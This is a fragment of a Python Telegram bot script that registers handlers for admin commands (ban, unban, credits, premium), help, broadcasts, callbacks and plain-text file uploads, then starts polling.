    SinnerTHEFUQQ.add_handler(CommandHandler("ban", ban))
    SinnerTHEFUQQ.add_handler(CommandHandler("unban", unban))
    SinnerTHEFUQQ.add_handler(CommandHandler("spamupr", spamupr))
    SinnerTHEFUQQ.add_handler(CommandHandler("spamapr", spamapr))
    SinnerTHEFUQQ.add_handler(add_credits_handler)
    SinnerTHEFUQQ.add_handler(set_premium_handler)  
    SinnerTHEFUQQ.add_handler(reset_credits_handler)
    SinnerTHEFUQQ.add_handler(unset_premium_handler) 
    SinnerTHEFUQQ.add_handler(reset_credits_handler)
    SinnerTHEFUQQ.add_handler(cr_handler)

    # 📖 Info Commands
    SinnerTHEFUQQ.add_handler(cmds_handler)
    SinnerTHEFUQQ.add_handler(how_credits_handler)
    SinnerTHEFUQQ.add_handler(help_handler)

    # 📢 Broadcast System
    SinnerTHEFUQQ.add_handler(broadcast_handler)
    SinnerTHEFUQQ.add_handler(stop_broadcast_handler) 
    SinnerTHEFUQQ.add_handler(stop_button_handler)

    # ✅ Callbacks (Low Priority)
    SinnerTHEFUQQ.add_handler(CallbackQueryHandler(stop_check, pattern=r"stop_check_\d+"))

    # 📂 File Handling (Lowest Priority - Runs Last)
    SinnerTHEFUQQ.add_handler(MessageHandler(Filters.document.mime_type("text/plain"), file_handler))
    SinnerTHEFUQQ.add_handler(receive_message_handler)



    # updater.start_polling()
    updater.start_polling(drop_pending_updates=True, poll_interval=0.1)
    updater.idle()

if __name__ == "__main__":
    main()